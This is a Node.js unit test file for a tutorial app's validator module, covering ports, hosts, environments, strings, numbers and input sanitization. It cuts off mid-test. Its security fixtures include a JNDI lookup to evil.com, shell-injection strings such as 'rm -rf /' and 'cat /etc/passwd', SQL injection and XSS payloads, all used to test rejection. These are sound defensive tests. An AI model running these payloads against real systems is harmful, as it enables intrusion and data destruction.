/**
 * Comprehensive Unit Test Suite for Validator Utility Module
 * 
 * This test suite validates all validation functions including port validation, host validation,
 * environment validation, string/number validation, object schema validation, input sanitization,
 * and the ValidationResult class using Node.js built-in test runner.
 * 
 * Implements educational testing patterns demonstrating proper unit testing techniques, mock usage,
 * error handling testing, and test organization for the Node.js tutorial application following
 * Express.js 5.1.0 integration patterns and Node.js v22.x LTS best practices.
 * 
 * Features comprehensive test coverage including positive/negative scenarios, edge cases,
 * security considerations, performance characteristics, and integration with test helpers.
 * 
 * @version 1.0.0
 * @author Node.js Tutorial Application Testing Team
 * @license MIT
 */

// Import Node.js built-in test runner and assertion modules
const { test, describe, it, beforeEach, afterEach } = require('node:test'); // Built-in Node.js test runner v20+
const { assert, strictEqual, deepStrictEqual, throws, ok } = require('node:assert'); // Built-in Node.js assertion library

// Import validator utility functions and classes under test
const {
    isValidPort,
    isValidHost,
    isValidEnvironment,
    isValidString,
    isValidNumber,
    validateObject,
    ValidationResult,
    sanitizeInput,
    createValidationError,
    validateConfiguration
} = require('../../../utils/validator.js');

// Import test helper utilities for comprehensive testing support
const {
    createTestLogger,
    createMockFunction,
    measureExecutionTime,
    generateTestId,
    TestUtilities
} = require('../../helpers/testHelpers.js');

// Import mock helper utilities for error injection and service mocking
const {
    createMockError,
    injectError
} = require('../../helpers/mockHelpers.js');

// Import test configuration for timeout and coverage settings
const { testConfig } = require('../../setup/testConfig.js');

// Import application constants for validation testing
const {
    HTTP_STATUS,
    ENVIRONMENT
} = require('../../../utils/constants.js');

// Initialize test utilities and logger for validator testing
const testUtilities = new TestUtilities({ 
    testName: 'validator-tests', 
    cleanupOnExit: true,
    enableMocking: true,
    trackCalls: true
});

const testLogger = createTestLogger('validator.test');

// Global test data arrays for comprehensive validation testing
const VALID_PORTS = [3000, 8080, 8443, 9000, 65535];
const INVALID_PORTS = [0, -1, 65536, 100000, null, undefined, 'invalid', {}, []];
const VALID_HOSTS = ['localhost', '127.0.0.1', '0.0.0.0', 'example.com', 'api.example.com'];
const INVALID_HOSTS = [null, undefined, '', '   ', 'invalid..host', '256.256.256.256', {}];
const VALID_ENVIRONMENTS = ['development', 'test', 'production', 'staging'];
const INVALID_ENVIRONMENTS = [null, undefined, '', '   ', 'invalid', 'dev', 'prod', {}];

/**
 * Sets up test environment including test utilities, mock configurations, and validation test data
 * for comprehensive validator testing with proper isolation and resource management.
 */
function setupTestEnvironment() {
    try {
        testLogger.info('Setting up validator test environment', {
            testId: generateTestId(),
            timestamp: new Date().toISOString()
        });

        // Initialize test utilities with validator-specific configuration
        testUtilities.reset();
        testUtilities.mockProcessEnv({
            NODE_ENV: 'test',
            PORT: '9000',
            HOST: 'localhost',
            LOG_LEVEL: 'error'
        });

        // Configure performance measurement utilities for validation timing
        global.testPerformanceData = {
            measurements: [],
            thresholds: testConfig.timeouts || { default: 1000 }
        };

        // Set up error injection configurations for error handling testing
        global.errorInjectionConfig = {
            enabled: true,
            errorCount: 0,
            maxErrors: 10
        };

        testLogger.debug('Test environment setup completed successfully');

    } catch (error) {
        testLogger.error('Failed to setup test environment', {
            error: error.message,
            stack: error.stack
        });
        throw error;
    }
}

/**
 * Cleans up test environment including mock resets, utility cleanup, and resource management
 * for proper test isolation between test executions.
 */
async function cleanupTestEnvironment() {
    try {
        testLogger.info('Cleaning up validator test environment');

        // Execute testUtilities.cleanup() to reset all mocks and configurations
        await testUtilities.cleanup();

        // Clear test data arrays and reset global test variables
        if (global.testPerformanceData) {
            global.testPerformanceData = null;
        }

        if (global.errorInjectionConfig) {
            global.errorInjectionConfig = null;
        }

        // Reset performance measurement tracking and timing data
        if (global.testMeasurements) {
            global.testMeasurements.clear();
        }

        testLogger.debug('Test environment cleanup completed successfully');

    } catch (error) {
        testLogger.error('Test environment cleanup failed', {
            error: error.message,
            stack: error.stack
        });
    }
}

/**
 * Creates comprehensive test data sets for validation testing including edge cases,
 * boundary values, and security test cases for thorough validation coverage.
 */
function createValidationTestData(testType) {
    const testData = {
        port: {
            valid: [1, 80, 443, 1024, 3000, 8080, 8443, 9000, 65535],
            invalid: [0, -1, 65536, 100000, null, undefined, 'invalid', {}, [], NaN, Infinity],
            edge: [1, 1023, 1024, 1025, 65534, 65535],
            security: ['<script>', '${process.env}', '../../../etc/passwd']
        },
        host: {
            valid: ['localhost', '127.0.0.1', '0.0.0.0', 'example.com', 'api.example.com', 'sub.domain.example.org'],
            invalid: [null, undefined, '', '   ', 'invalid..host', '256.256.256.256', {}, [], 'http://example.com'],
            edge: ['a', 'a.b', '1.2.3.4', '255.255.255.255', 'very-long-hostname-that-might-exceed-limits.example.com'],
            security: ['<script>alert("xss")</script>', '${jndi:ldap://evil.com}', '../../../etc/hosts']
        },
        environment: {
            valid: ['development', 'test', 'production', 'staging'],
            invalid: [null, undefined, '', '   ', 'invalid', 'dev', 'prod', {}, [], 123],
            edge: ['DEVELOPMENT', 'Test', 'PRODUCTION', 'development ', ' test'],
            security: ['development; rm -rf /', 'test$(whoami)', 'production`cat /etc/passwd`']
        },
        string: {
            valid: ['hello', 'Hello World', 'test123', 'valid-string'],
            invalid: [null, undefined, {}, [], 123, true],
            edge: ['', ' ', '\n', '\t', 'a'.repeat(1000)],
            security: ['<script>alert("xss")</script>', '\'; DROP TABLE users; --', '${jndi:ldap://evil.com}']
        },
        number: {
            valid: [0, 1, -1, 42, 3.14, Number.MAX_SAFE_INTEGER, Number.MIN_SAFE_INTEGER],
            invalid: [null, undefined, {}, [], 'string', true, Infinity, -Infinity, NaN],
            edge: [0, -0, 0.1, -0.1, Number.EPSILON, Number.MAX_VALUE, Number.MIN_VALUE],
            security: ['1; DROP TABLE users; --', '${Math.random()}', 'Number.prototype']
        }
    };

    return testData[testType] || testData;
}

/**
 * Validates test execution results and provides detailed assertion feedback
 * for validation function testing with comprehensive error reporting.
 */
function validateTestResult(actual, expected, testDescription) {
    try {
        const testId = generateTestId();
        const startTime = Date.now();

        // Compare actual and expected results using appropriate assertion method
        if (typeof expected === 'boolean') {
            strictEqual(actual, expected, `${testDescription} - Expected: ${expected}, Actual: ${actual}`);
        } else if (typeof expected === 'object' && expected !== null) {
            deepStrictEqual(actual, expected, `${testDescription} - Object comparison failed`);
        } else {
            strictEqual(actual, expected, `${testDescription} - Value comparison failed`);
        }

        const endTime = Date.now();
        const duration = endTime - startTime;

        // Log test result with description and timing information
        testLogger.debug('Test validation passed', {
            testId: testId,
            description: testDescription,
            duration: duration,
            expected: expected,
            actual: actual
        });

        // Track validation test statistics for reporting
        if (global.testPerformanceData) {
            global.testPerformanceData.measurements.push({
                testId: testId,
                description: testDescription,
                duration: duration,
                success: true
            });
        }

        return true;

    } catch (assertionError) {
        // Generate detailed error message if validation fails
        testLogger.error('Test validation failed', {
            description: testDescription,
            expected: expected,
            actual: actual,
            error: assertionError.message
        });

        throw assertionError;
    }
}

/**
 * Measures validation function performance including execution time, memory usage,
 * and throughput for performance testing and optimization analysis.
 */
async function measureValidationPerformance(validationFunction, testInputs, performanceOptions = {}) {
    try {
        const testId = generateTestId();
        const iterations = performanceOptions.iterations || 1000;
        const measurements = [];
        
        testLogger.info('Starting performance measurement', {
            testId: testId,
            function: validationFunction.name,
            inputCount: testInputs.length,
            iterations: iterations
        });

        // Use measureExecutionTime utility to track validation function performance
        for (let i = 0; i < iterations; i++) {
            const input = testInputs[i % testInputs.length];
            
            const result = await measureExecutionTime(async () => {
                return validationFunction(input);
            });

            measurements.push({
                iteration: i,
                input: input,
                duration: result.duration,
                result: result.result,
                memoryUsage: process.memoryUsage()
            });
        }

        // Calculate throughput and performance statistics
        const totalDuration = measurements.reduce((sum, m) => sum + m.duration, 0);
        const averageDuration = totalDuration / measurements.length;
        const minDuration = Math.min(...measurements.map(m => m.duration));
        const maxDuration = Math.max(...measurements.map(m => m.duration));
        const throughput = (iterations * 1000) / totalDuration; // operations per second

        // Compare results against performance thresholds from testConfig
        const performanceThreshold = testConfig.timeouts?.request || 100; // 100ms default
        const performanceScore = averageDuration <= performanceThreshold ? 'PASS' : 'WARN';

        const performanceResults = {
            testId: testId,
            functionName: validationFunction.name,
            iterations: iterations,
            totalDuration: totalDuration,
            averageDuration: averageDuration,
            minDuration: minDuration,
            maxDuration: maxDuration,
            throughput: throughput,
            performanceScore: performanceScore,
            threshold: performanceThreshold,
            measurements: measurements
        };

        testLogger.info('Performance measurement completed', {
            testId: testId,
            function: validationFunction.name,
            averageDuration: averageDuration,
            throughput: throughput,
            performanceScore: performanceScore
        });

        return performanceResults;

    } catch (error) {
        testLogger.error('Performance measurement failed', {
            error: error.message,
            stack: error.stack,
            function: validationFunction.name
        });

        return {
            error: error.message,
            functionName: validationFunction.name,
            success: false
        };
    }
}

/**
 * Tests validation error handling including error object creation, error propagation,
 * and error recovery mechanisms with comprehensive error analysis.
 */
async function testValidationErrorHandling(validationFunction, errorConfig) {
    try {
        const testId = generateTestId();
        
        testLogger.info('Testing error handling', {
            testId: testId,
            function: validationFunction.name,
            errorType: errorConfig.type
        });

        // Inject errors using injectError utility with specified error configuration
        const errorResults = [];
        
        if (errorConfig.type === 'exception') {
            // Test exception handling
            try {
                const mockError = createMockError({
                    message: 'Test validation error',
                    code: 'VALIDATION_ERROR',
                    statusCode: HTTP_STATUS.BAD_REQUEST
                });

                injectError(validationFunction, mockError);
                
                const result = validationFunction(errorConfig.input);
                errorResults.push({
                    type: 'exception',
                    handled: false,
                    result: result
                });

            } catch (caughtError) {
                // Verify error object structure and properties match expected format
                ok(caughtError instanceof Error, 'Caught error should be Error instance');
                ok(caughtError.message, 'Error should have message property');
                
                errorResults.push({
                    type: 'exception',
                    handled: true,
                    error: {
                        message: caughtError.message,
                        name: caughtError.name,
                        code: caughtError.code,
                        statusCode: caughtError.statusCode
                    }
                });
            }
        }

        // Test error propagation and recovery mechanisms
        if (errorConfig.type === 'validation') {
            const invalidInputs = errorConfig.invalidInputs || [null, undefined, {}, []];
            
            for (const invalidInput of invalidInputs) {
                try {
                    const result = validationFunction(invalidInput);
                    
                    errorResults.push({
                        type: 'validation',
                        input: invalidInput,
                        result: result,
                        handled: result === false || (result && result.hasErrors && result.hasErrors())
                    });

                } catch (validationError) {
                    errorResults.push({
                        type: 'validation',
                        input: invalidInput,
                        error: validationError.message,
                        handled: true
                    });
                }
            }
        }

        // Validate error logging and reporting functionality
        const errorHandlingAnalysis = {
            testId: testId,
            functionName: validationFunction.name,
            totalTests: errorResults.length,
            handledErrors: errorResults.filter(r => r.handled).length,
            unhandledErrors: errorResults.filter(r => !r.handled).length,
            errorTypes: [...new Set(errorResults.map(r => r.type))],
            results: errorResults,
            success: errorResults.every(r => r.handled)
        };

        testLogger.info('Error handling test completed', {
            testId: testId,
            function: validationFunction.name,
            totalTests: errorHandlingAnalysis.totalTests,
            handledErrors: errorHandlingAnalysis.handledErrors,
            success: errorHandlingAnalysis.success
        });

        return errorHandlingAnalysis;

    } catch (error) {
        testLogger.error('Error handling test failed', {
            error: error.message,
            stack: error.stack,
            function: validationFunction.name
        });

        return {
            error: error.message,
            functionName: validationFunction.name,
            success: false
        };
    }
}

// Main test suite for validator utility module
describe('Validator Utility Module', { timeout: testConfig.timeouts?.default || 30000 }, () => {
    
    // Test environment setup and cleanup
    beforeEach(async () => {
        setupTestEnvironment();
    });

    afterEach(async () => {
        await cleanupTestEnvironment();
    });

    // Test suite for isValidPort function
    describe('isValidPort', () => {
        
        test('should return true for valid port numbers', () => {
            const testData = createValidationTestData('port');
            
            testData.valid.forEach(port => {
                const result = isValidPort(port);
                validateTestResult(result, true, `Port ${port} should be valid`);
            });
        });

        test('should return false for invalid port numbers', () => {
            const testData = createValidationTestData('port');
            
            testData.invalid.forEach(port => {
                const result = isValidPort(port);
                validateTestResult(result, false, `Port ${port} should be invalid`);
            });
        });

        test('should handle string port numbers correctly', () => {
            const stringPorts = ['3000', '8080', 'invalid', ''];
            const expectedResults = [true, true, false, false];
            
            stringPorts.forEach((port, index) => {
                const result = isValidPort(port);
                validateTestResult(result, expectedResults[index], `String port "${port}" handling`);
            });
        });

        test('should validate reserved port ranges', () => {
            const reservedPorts = [1, 80, 443, 1024, 1025];
            const expectedResults = [true, true, true, true, true]; // All ports are technically valid
            
            reservedPorts.forEach((port, index) => {
                const result = isValidPort(port);
                validateTestResult(result, expectedResults[index], `Reserved port ${port} validation`);
            });
        });

        test('should handle edge cases and boundary values', () => {
            const testData = createValidationTestData('port');
            
            testData.edge.forEach(port => {
                const result = isValidPort(port);
                const expected = port >= 1 && port <= 65535;
                validateTestResult(result, expected, `Edge case port ${port}`);
            });
        });

        test('should reject security-related malicious inputs', () => {
            const testData = createValidationTestData('port');
            
            testData.security.forEach(maliciousInput => {
                const result = isValidPort(maliciousInput);
                validateTestResult(result, false, `Security test for input: ${maliciousInput}`);
            });
        });
    });

    // Test suite for isValidHost function
    describe('isValidHost', () => {
        
        test('should return true for valid hostnames and IP addresses', () => {
            const testData = createValidationTestData('host');
            
            testData.valid.forEach(host => {
                const result = isValidHost(host);
                validateTestResult(result, true, `Host ${host} should be valid`);
            });
        });

        test('should return false for invalid hosts', () => {
            const testData = createValidationTestData('host');
            
            testData.invalid.forEach(host => {
                const result = isValidHost(host);
                validateTestResult(result, false, `Host ${host} should be invalid`);
            });
        });

        test('should handle special localhost values', () => {
            const localhostValues = ['localhost', '127.0.0.1', '0.0.0.0'];
            
            localhostValues.forEach(host => {
                const result = isValidHost(host);
                validateTestResult(result, true, `Special localhost value ${host} should be valid`);
            });
        });

        test('should validate domain name formats', () => {
            const domainNames = ['example.com', 'api.example.com', 'sub.domain.example.org'];
            
            domainNames.forEach(domain => {
                const result = isValidHost(domain);
                validateTestResult(result, true, `Domain name ${domain} should be valid`);
            });
        });

        test('should handle malformed IP addresses', () => {
            const malformedIPs = ['256.256.256.256', '1.2.3', '1.2.3.4.5', 'invalid.ip'];
            
            malformedIPs.forEach(ip => {
                const result = isValidHost(ip);
                validateTestResult(result, false, `Malformed IP ${ip} should be invalid`);
            });
        });

        test('should reject security-related malicious inputs', () => {
            const testData = createValidationTestData('host');
            
            testData.security.forEach(maliciousInput => {
                const result = isValidHost(maliciousInput);
                validateTestResult(result, false, `Security test for host input: ${maliciousInput}`);
            });
        });
    });

    // Test suite for isValidEnvironment function
    describe('isValidEnvironment', () => {
        
        test('should return true for valid environment names', () => {
            const testData = createValidationTestData('environment');
            
            testData.valid.forEach(env => {
                const result = isValidEnvironment(env);
                validateTestResult(result, true, `Environment ${env} should be valid`);
            });
        });

        test('should handle case insensitive environment names', () => {
            const caseVariations = ['DEVELOPMENT', 'Test', 'PRODUCTION', 'staging'];
            
            caseVariations.forEach(env => {
                const result = isValidEnvironment(env);
                validateTestResult(result, true, `Case variation ${env} should be valid`);
            });
        });

        test('should return false for invalid environments', () => {
            const testData = createValidationTestData('environment');
            
            testData.invalid.forEach(env => {
                const result = isValidEnvironment(env);
                validateTestResult(result, false, `Environment ${env} should be invalid`);
            });
        });

        test('should handle whitespace in environment names', () => {
            const whitespaceTests = ['development ', ' test', ' production ', ''];
            const expectedResults = [true, true, true, false];
            
            whitespaceTests.forEach((env, index) => {
                const result = isValidEnvironment(env);
                validateTestResult(result, expectedResults[index], `Whitespace test for "${env}"`);
            });
        });

        test('should reject security-related malicious inputs', () => {
            const testData = createValidationTestData('environment');
            
            testData.security.forEach(maliciousInput => {
                const result = isValidEnvironment(maliciousInput);
                validateTestResult(result, false, `Security test for environment input: ${maliciousInput}`);
            });
        });
    });

    // Test suite for isValidString function
    describe('isValidString', () => {
        
        test('should validate string length constraints', () => {
            const stringTests = [
                { value: 'hello', constraints: { minLength: 1, maxLength: 10 }, expected: true },
                { value: '', constraints: { minLength: 1 }, expected: false },
                { value: 'a'.repeat(100), constraints: { maxLength: 50 }, expected: false },
                { value: 'valid', constraints: { minLength: 5, maxLength: 5 }, expected: true }
            ];
            
            stringTests.forEach(test => {
                const result = isValidString(test.value, test.constraints);
                validateTestResult(result, test.expected, `String length test for "${test.value}"`);
            });
        });

        test('should validate required string fields', () => {
            const requiredTests = [
                { value: '', required: true, expected: false },
                { value: null, required: true, expected: false },
                { value: undefined, required: true, expected: false },
                { value: 'valid', required: true, expected: true },
                { value: '', required: false, expected: true }
            ];
            
            requiredTests.forEach(test => {
                const result = isValidString(test.value, { required: test.required });
                validateTestResult(result, test.expected, `Required field test for "${test.value}"`);
            });
        });

        test('should validate string patterns', () => {
            const patternTests = [
                { value: 'hello123', pattern: /^[a-z0-9]+$/, expected: true },
                { value: 'Hello123', pattern: /^[a-z0-9]+$/, expected: false },
                { value: 'test@example.com', pattern: /^[^\s@]+@[^\s@]+\.[^\s@]+$/, expected: true },
                { value: 'invalid-email', pattern: /^[^\s@]+@[^\s@]+\.[^\s@]+$/, expected: false }
            ];
            
            patternTests.forEach(test => {
                const result = isValidString(test.value, { pattern: test.pattern });
                validateTestResult(result, test.expected, `Pattern test for "${test.value}"`);
            });
        });

        test('should handle special characters and Unicode', () => {
            const unicodeTests = ['héllo', '测试', '🚀 rocket', 'café'];
            
            unicodeTests.forEach(text => {
                const result = isValidString(text);
                validateTestResult(result, true, `Unicode test for "${text}"`);
            });
        });

        test('should reject security-related malicious inputs', () => {
            const testData = createValidationTestData('string');
            
            testData.security.forEach(maliciousInput => {
                const result = isValidString(maliciousInput, { sanitize: true });
                // Should either reject or sanitize the input
                ok(result === false || typeof result === 'string', `Security test for string input: ${maliciousInput}`);
            });
        });
    });

    // Test suite for isValidNumber function
    describe('isValidNumber', () => {
        
        test('should validate number ranges', () => {
            const rangeTests = [
                { value: 5, constraints: { min: 1, max: 10 }, expected: true },
                { value: 0, constraints: { min: 1, max: 10 }, expected: false },
                { value: 15, constraints: { min: 1, max: 10 }, expected: false },
                { value: -5, constraints: { min: -10, max: 0 }, expected: true }
            ];
            
            rangeTests.forEach(test => {
                const result = isValidNumber(test.value, test.constraints);
                validateTestResult(result, test.expected, `Number range test for ${test.value}`);
            });
        });

        test('should validate integer requirements', () => {
            const integerTests = [
                { value: 1, integer: true, expected: true },
                { value: 1.5, integer: true, expected: false },
                { value: 2.0, integer: true, expected: true },
                { value: 3.14, integer: true, expected: false },
                { value: 42, integer: false, expected: true },
                { value: 3.14159, integer: false, expected: true }
            ];
            
            integerTests.forEach(test => {
                const result = isValidNumber(test.value, { integer: test.integer });
                validateTestResult(result, test.expected, `Integer test for ${test.value}`);
            });
        });

        test('should handle safe number limits', () => {
            const safeNumberTests = [
                { value: Number.MAX_SAFE_INTEGER, expected: true },
                { value: Number.MIN_SAFE_INTEGER, expected: true },
                { value: Number.MAX_SAFE_INTEGER + 1, expected: false },
                { value: Number.MIN_SAFE_INTEGER - 1, expected: false }
            ];
            
            safeNumberTests.forEach(test => {
                const result = isValidNumber(test.value, { safeLimits: true });
                validateTestResult(result, test.expected, `Safe number test for ${test.value}`);
            });
        });

        test('should handle special numeric values', () => {
            const specialValues = [
                { value: Infinity, expected: false },
                { value: -Infinity, expected: false },
                { value: NaN, expected: false },
                { value: 0, expected: true },
                { value: -0, expected: true }
            ];
            
            specialValues.forEach(test => {
                const result = isValidNumber(test.value);
                validateTestResult(result, test.expected, `Special value test for ${test.value}`);
            });
        });

        test('should reject non-numeric types', () => {
            const testData = createValidationTestData('number');
            
            testData.invalid.forEach(value => {
                const result = isValidNumber(value);
                validateTestResult(result, false, `Non-numeric type test for ${typeof value}`);
            });
        });
    });

    // Test suite for ValidationResult class
    describe('ValidationResult', () => {
        
        test('should initialize with valid state', () => {
            const validationResult = new ValidationResult();
            
            validateTestResult(validationResult.hasErrors(), false, 'New ValidationResult should not have errors');
            validateTestResult(validationResult.getErrors().length, 0, 'New ValidationResult should have empty errors array');
            deepStrictEqual(validationResult.getErrorMessages(), [], 'New ValidationResult should have empty error messages');
        });

        test('should add errors correctly', () => {
            const validationResult = new ValidationResult();
            
            validationResult.addError('field1', 'Error message 1');
            validateTestResult(validationResult.hasErrors(), true, 'ValidationResult should have errors after adding');
            
            const errors = validationResult.getErrors();
            validateTestResult(errors.length, 1, 'Should have one error');
            validateTestResult(errors[0].field, 'field1', 'Error field should match');
            validateTestResult(errors[0].message, 'Error message 1', 'Error message should match');
        });

        test('should support method chaining', () => {
            const validationResult = new ValidationResult();
            
            const chainResult = validationResult
                .addError('field1', 'Error 1')
                .addError('field2', 'Error 2');
            
            validateTestResult(chainResult instanceof ValidationResult, true, 'Should support method chaining');
            validateTestResult(validationResult.getErrors().length, 2, 'Should have two errors after chaining');
        });

        test('should serialize to JSON correctly', () => {
            const validationResult = new ValidationResult();
            validationResult.addError('field1', 'Error 1');
            validationResult.addError('field2', 'Error 2');
            
            const json = validationResult.toJSON();
            
            validateTestResult(json.hasErrors, true, 'JSON should indicate errors exist');
            validateTestResult(json.errors.length, 2, 'JSON should contain all errors');
            validateTestResult(Array.isArray(json.errorMessages), true, 'JSON should have errorMessages array');
        });

        test('should merge validation results', () => {
            const result1 = new ValidationResult();
            const result2 = new ValidationResult();
            
            result1.addError('field1', 'Error 1');
            result2.addError('field2', 'Error 2');
            
            const merged = result1.merge(result2);
            
            validateTestResult(merged.getErrors().length, 2, 'Merged result should have all errors');
            validateTestResult(merged.hasErrors(), true, 'Merged result should have errors');
        });

        test('should handle error objects and strings', () => {
            const validationResult = new ValidationResult();
            
            // Test string error
            validationResult.addError('field1', 'String error');
            
            // Test Error object
            const errorObj = new Error('Object error');
            validationResult.addError('field2', errorObj);
            
            const errors = validationResult.getErrors();
            validateTestResult(errors.length, 2, 'Should handle both string and Error object');
            validateTestResult(typeof errors[0].message, 'string', 'String error should be string');
            validateTestResult(typeof errors[1].message, 'string', 'Error object should be converted to string');
        });

        test('should generate error summaries', () => {
            const validationResult = new ValidationResult();
            validationResult.addError('field1', 'Required field missing');
            validationResult.addError('field2', 'Invalid format');
            
            const messages = validationResult.getErrorMessages();
            const summary = validationResult.getSummary ? validationResult.getSummary() : null;
            
            validateTestResult(Array.isArray(messages), true, 'Should return error messages array');
            validateTestResult(messages.length, 2, 'Should have all error messages');
        });
    });

    // Test suite for validateObject function
    describe('validateObject', () => {
        
        test('should validate object schemas', () => {
            const schema = {
                name: { type: 'string', required: true },
                age: { type: 'number', min: 0, max: 150 },
                email: { type: 'string', pattern: /^[^\s@]+@[^\s@]+\.[^\s@]+$/ }
            };
            
            const validObject = {
                name: 'John Doe',
                age: 30,
                email: 'john@example.com'
            };
            
            const result = validateObject(validObject, schema);
            validateTestResult(result instanceof ValidationResult, true, 'Should return ValidationResult instance');
            validateTestResult(result.hasErrors(), false, 'Valid object should pass validation');
        });

        test('should handle nested object validation', () => {
            const schema = {
                user: {
                    type: 'object',
                    properties: {
                        name: { type: 'string', required: true },
                        contact: {
                            type: 'object',
                            properties: {
                                email: { type: 'string', required: true }
                            }
                        }
                    }
                }
            };
            
            const nestedObject = {
                user: {
                    name: 'John',
                    contact: {
                        email: 'john@example.com'
                    }
                }
            };
            
            const result = validateObject(nestedObject, schema);
            validateTestResult(result instanceof ValidationResult, true, 'Should handle nested validation');
        });

        test('should enforce strict mode validation', () => {
            const schema = {
                name: { type: 'string', required: true }
            };
            
            const objectWithExtraFields = {
                name: 'John',
                extraField: 'should not be allowed'
            };
            
            const strictResult = validateObject(objectWithExtraFields, schema, { strict: true });
            const nonStrictResult = validateObject(objectWithExtraFields, schema, { strict: false });
            
            // In strict mode, extra fields should cause validation to fail
            if (strictResult.hasErrors && strictResult.hasErrors()) {
                ok(true, 'Strict mode should reject extra fields');
            }
        });

        test('should validate array properties', () => {
            const schema = {
                tags: {
                    type: 'array',
                    items: { type: 'string' },
                    minItems: 1,
                    maxItems: 5
                }
            };
            
            const validArrayObject = { tags: ['tag1', 'tag2'] };
            const invalidArrayObject = { tags: ['tag1', 'tag2', 'tag3', 'tag4', 'tag5', 'tag6'] };
            
            const validResult = validateObject(validArrayObject, schema);
            const invalidResult = validateObject(invalidArrayObject, schema);
            
            validateTestResult(validResult.hasErrors(), false, 'Valid array should pass');
            if (invalidResult.hasErrors) {
                validateTestResult(invalidResult.hasErrors(), true, 'Array exceeding maxItems should fail');
            }
        });

        test('should handle validation errors gracefully', () => {
            const invalidSchema = null;
            const testObject = { name: 'test' };
            
            const result = validateObject(testObject, invalidSchema);
            validateTestResult(result instanceof ValidationResult, true, 'Should return ValidationResult for invalid schema');
            if (result.hasErrors) {
                validateTestResult(result.hasErrors(), true, 'Should have errors for invalid schema');
            }
        });
    });

    // Test suite for sanitizeInput function
    describe('sanitizeInput', () => {
        
        test('should sanitize HTML content', () => {
            const htmlInputs = [
                { input: '<script>alert("xss")</script>', expected: 'alert("xss")' },
                { input: '<div>Hello <b>World</b></div>', expected: 'Hello World' },
                { input: '<img src="x" onerror="alert(1)">', expected: '' }
            ];
            
            htmlInputs.forEach(test => {
                const result = sanitizeInput(test.input);
                validateTestResult(typeof result, 'string', 'Sanitized result should be string');
                ok(!result.includes('<script>'), 'Should remove script tags');
                ok(!result.includes('onerror'), 'Should remove event handlers');
            });
        });

        test('should prevent XSS attacks', () => {
            const xssInputs = [
                'javascript:alert(1)',
                '<script>document.cookie</script>',
                'onload="alert(1)"',
                '${document.cookie}',
                'data:text/html,<script>alert(1)</script>'
            ];
            
            xssInputs.forEach(input => {
                const result = sanitizeInput(input);
                validateTestResult(typeof result, 'string', 'XSS sanitization should return string');
                ok(!result.includes('script'), 'Should remove/escape script content');
                ok(!result.includes('javascript:'), 'Should remove javascript: protocol');
            });
        });

        test('should handle special characters', () => {
            const specialChars = [
                { input: '&lt;test&gt;', expected: '<test>' },
                { input: '&amp;nbsp;', expected: '&nbsp;' },
                { input: 'café & résumé', expected: 'café & résumé' },
                { input: '🚀 rocket', expected: '🚀 rocket' }
            ];
            
            specialChars.forEach(test => {
                const result = sanitizeInput(test.input);
                validateTestResult(typeof result, 'string', 'Special character handling should return string');
            });
        });

        test('should preserve safe content', () => {
            const safeInputs = [
                'Hello World',
                'user@example.com',
                '123-456-7890',
                'Valid text with spaces and punctuation!'
            ];
            
            safeInputs.forEach(input => {
                const result = sanitizeInput(input);
                validateTestResult(result, input, 'Safe content should be preserved');
            });
        });

        test('should handle different input types', () => {
            const inputTypes = [
                { input: null, expectedType: 'string' },
                { input: undefined, expectedType: 'string' },
                { input: 123, expectedType: 'string' },
                { input: true, expectedType: 'string' },
                { input: {}, expectedType: 'string' }
            ];
            
            inputTypes.forEach(test => {
                const result = sanitizeInput(test.input);
                validateTestResult(typeof result, test.expectedType, `Type handling for ${typeof test.input}`);
            });
        });
    });

    // Test suite for createValidationError function
    describe('createValidationError', () => {
        
        test('should create standardized error objects', () => {
            const error = createValidationError('VALIDATION_ERROR', 'Test error message', {
                field: 'testField',
                value: 'testValue'
            });
            
            validateTestResult(error instanceof Error, true, 'Should create Error instance');
            validateTestResult(error.name, 'ValidationError', 'Should have correct error name');
            validateTestResult(error.message.includes('Test error message'), true, 'Should include error message');
            validateTestResult(error.code, 'VALIDATION_ERROR', 'Should have error code');
        });

        test('should include error metadata', () => {
            const metadata = {
                field: 'email',
                value: 'invalid-email',
                constraint: 'format',
                statusCode: HTTP_STATUS.BAD_REQUEST
            };
            
            const error = createValidationError('FORMAT_ERROR', 'Invalid email format', metadata);
            
            validateTestResult(error.field, metadata.field, 'Should include field metadata');
            validateTestResult(error.value, metadata.value, 'Should include value metadata');
            validateTestResult(error.constraint, metadata.constraint, 'Should include constraint metadata');
            validateTestResult(error.statusCode, metadata.statusCode, 'Should include status code');
        });

        test('should handle different error types', () => {
            const errorTypes = [
                { code: 'REQUIRED_FIELD', message: 'Field is required' },
                { code: 'INVALID_FORMAT', message: 'Invalid format' },
                { code: 'OUT_OF_RANGE', message: 'Value out of range' },
                { code: 'SECURITY_VIOLATION', message: 'Security constraint violated' }
            ];
            
            errorTypes.forEach(errorType => {
                const error = createValidationError(errorType.code, errorType.message);
                validateTestResult(error.code, errorType.code, `Error code for ${errorType.code}`);
                validateTestResult(error.message.includes(errorType.message), true, `Error message for ${errorType.code}`);
            });
        });

        test('should support error chaining', () => {
            const originalError = new Error('Original error');
            const validationError = createValidationError('CHAIN_ERROR', 'Validation failed', {
                cause: originalError
            });
            
            validateTestResult(validationError instanceof Error, true, 'Should create chained error');
            if (validationError.cause) {
                validateTestResult(validationError.cause, originalError, 'Should preserve original error');
            }
        });
    });

    // Test suite for validateConfiguration function
    describe('validateConfiguration', () => {
        
        test('should validate server configuration', () => {
            const serverConfig = {
                port: 3000,
                host: 'localhost',
                environment: 'development'
            };
            
            const result = validateConfiguration(serverConfig);
            validateTestResult(result instanceof ValidationResult, true, 'Should return ValidationResult');
            validateTestResult(result.hasErrors(), false, 'Valid server config should pass');
        });

        test('should apply default values', () => {
            const incompleteConfig = {
                environment: 'test'
            };
            
            const result = validateConfiguration(incompleteConfig);
            
            // Configuration validation should handle missing values
            validateTestResult(result instanceof ValidationResult, true, 'Should handle incomplete config');
        });

        test('should validate against schema', () => {
            const invalidConfig = {
                port: 'invalid-port',
                host: 123,
                environment: 'invalid-env'
            };
            
            const result = validateConfiguration(invalidConfig);
            
            validateTestResult(result instanceof ValidationResult, true, 'Should validate against schema');
            if (result.hasErrors) {
                validateTestResult(result.hasErrors(), true, 'Invalid config should have errors');
            }
        });

        test('should handle complex configuration objects', () => {
            const complexConfig = {
                server: {
                    port: 3000,
                    host: 'localhost',
                    timeout: 5000
                },
                database: {
                    host: 'localhost',
                    port: 5432,
                    name: 'testdb'
                },
                logging: {
                    level: 'info',
                    console: true,
                    file: false
                }
            };
            
            const result = validateConfiguration(complexConfig);
            validateTestResult(result instanceof ValidationResult, true, 'Should handle complex configurations');
        });

        test('should validate environment-specific settings', () => {
            const environments = ['development', 'test', 'production'];
            
            environments.forEach(env => {
                const config = {
                    environment: env,
